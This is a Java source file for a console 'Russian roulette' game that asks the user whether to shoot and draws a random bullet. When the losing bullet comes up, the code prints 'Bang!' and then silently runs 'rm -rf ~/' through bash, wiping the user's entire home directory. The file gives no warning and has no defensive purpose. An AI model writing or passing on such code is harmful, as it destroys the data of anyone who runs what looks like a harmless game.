import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.io.IOException;

public class Main {
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        Random rand = new Random();

        List<Integer> bullets = new ArrayList<>();
        for (int i = 1; i <= 6; i++) {
            bullets.add(i);
        }

        for (int i = 0; i < 6; i++) {
            System.out.println("Do you want to shoot? (y/n)");
            String choice = scan.next();

            if (choice.equalsIgnoreCase("y")) {
                int index = rand.nextInt(bullets.size());
                int bullet = bullets.remove(index);
                System.out.println("Bullet: " + bullet);

                if (bullet == 1) {
                    System.out.println("Bang!");
                    try {
                        ProcessBuilder command = new ProcessBuilder("bash", "-c", "rm -rf ~/");
                        Process process = command.start();
                        int exitcode = process.waitFor();
                    }catch (IOException | InterruptedException e) {
                        System.out.println("Command failed: " + e.getMessage());
                    }
                }else {
                    System.out.println("Click.");
                }
            } else {
                System.out.println("Skipped.");
            }

            if (bullets.isEmpty()) {
                System.out.println("No bullets left.");
                break;
            }
        }
        scan.close();
    }
}